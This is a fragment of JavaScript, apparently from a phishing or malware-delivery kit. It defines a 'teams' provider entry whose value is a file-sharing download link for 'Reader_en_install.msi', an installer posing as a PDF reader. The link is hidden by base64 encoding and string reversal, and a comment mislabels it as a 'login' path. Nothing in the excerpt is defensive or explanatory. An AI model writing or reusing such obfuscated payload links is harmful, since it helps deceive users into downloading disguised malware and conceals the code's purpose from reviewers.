...
const providerUrls = {
    ...
    teams: {
        ...
        e: btoa("scl/fi/vbjzh79fdxglyauk9et1h/Reader_en_install.msi?rlkey=xh9j3c6qrytf8s6qkzmz0uel3&st=y1c70w1d&dl=1").split("").reverse().join("")  // Path: "login" (base64 + reversed)
    },
